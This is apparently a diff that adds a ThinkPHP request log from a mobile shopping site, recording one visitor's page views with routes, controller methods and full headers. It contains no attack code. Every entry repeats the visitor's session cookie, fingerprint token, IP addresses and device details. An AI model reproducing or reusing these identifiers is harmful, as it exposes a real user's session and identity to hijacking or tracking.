+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=3; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201513080586425%7D; __51cke__=; __51laig__=3',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:12+08:00 ] 172.31.179.54 49.118.138.184 GET /index/cart/index.html
+[ log ] dbgj.hoonking.com/index/cart/index.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,225.37kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'cart',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/user_link.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=4; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201513080610830%7D; __51cke__=; __51laig__=4',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/cart/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+	* 购物车首页
+	* @author tangtanglove
+	*/
+Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Cart.php 24 - 68
+}
+
+[ info ] [ VIEW ] ./themes/default/index/cart_index.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'cartMoney',
+  3 => 'selectGoods',
+  4 => 'lists',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:16+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=4; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%204%2C%20%22expires%22%3A%201513080610830%7D; __51cke__=; __51laig__=4',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:17+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=5; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201513080676984%7D; __51cke__=; __51laig__=5',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:19+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=6; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%206%2C%20%22expires%22%3A%201513080678503%7D; __51cke__=; __51laig__=6',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:28+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=7; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%207%2C%20%22expires%22%3A%201513080680099%7D; __51cke__=; __51laig__=7',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:29+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=8; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%208%2C%20%22expires%22%3A%201513080688825%7D; __51cke__=; __51laig__=8',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:31+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,280.91kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=9; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%209%2C%20%22expires%22%3A%201513080690337%7D; __51cke__=; __51laig__=9',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:36+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,280.90kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=10; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2010%2C%20%22expires%22%3A%201513080692087%7D; __51cke__=; __51laig__=10',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:40+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,280.90kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=11; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2011%2C%20%22expires%22%3A%201513080697803%7D; __51cke__=; __51laig__=11',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:40+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/user_link.html
+[ log ] dbgj.hoonking.com/index/user/user_link.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,280.90kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'user_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=11; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2011%2C%20%22expires%22%3A%201513080697803%7D; __51cke__=; __51laig__=11',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/user_link_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 推广链接
+     * @author  赵祥祥654377754
+     */
+Method [ <user> public method user_link ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 358 - 361
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_link.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:43+08:00 ] 172.31.179.54 49.118.138.184 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.109375s][吞吐率：9.14req/s] [内存消耗：2,294.66kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/base/login.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=12; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2012%2C%20%22expires%22%3A%201513080701452%7D; __51cke__=; __51laig__=12',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:41:52+08:00 ] 172.31.179.54 49.118.138.184 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,218.52kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=iu2krkpurqin4hb2k5rvpmf5e2; fingerprint=8J8z6lV2mD59yI8M0TGa1513078717787; a1724_pages=12; a1724_times=1; __tins__19221724=%7B%22sid%22%3A%201513078715957%2C%20%22vd%22%3A%2012%2C%20%22expires%22%3A%201513080701452%7D; __51cke__=; __51laig__=12',
+  'x-requested-with' => 'com.UCMobile',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:42:13+08:00 ] 172.31.179.54 49.118.138.184 GET /index/goods/detail.html?id=49
+[ log ] dbgj.hoonking.com/index/goods/detail.html?id=49 [运行时间：0.093750s][吞吐率：10.67req/s] [内存消耗：2,235.90kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'goods',
+    2 => 'detail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11s Build/NMF26X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.1.717 U3/0.8.0 Mobile Safari/534.30',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,en-US;q=0.8',
